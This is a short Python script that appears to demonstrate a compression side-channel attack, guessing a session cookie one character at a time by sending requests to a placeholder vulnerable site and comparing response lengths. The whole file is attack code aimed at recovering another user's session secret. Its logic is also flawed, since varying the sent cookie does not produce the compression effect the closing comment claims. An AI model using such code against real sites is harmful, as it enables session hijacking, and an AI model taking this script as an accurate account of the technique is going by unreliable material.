import requests

def measure_response_length(url, cookie):
    headers = {'Cookie': f'session={cookie}'}
    response = requests.get(url, headers=headers)
    return len(response.content)

url = "https://vulnerable-website.com"
known_cookie_part = "known_value"

# Assume we know part of the cookie and want to discover the rest
for char in "abcdefghijklmnopqrstuvwxyz":
    cookie_guess = known_cookie_part + char
    length = measure_response_length(url, cookie_guess)
    print(f"Cookie guess: {cookie_guess} - Response length: {length}")

# The correct guess will typically result in a shorter response length due to better compression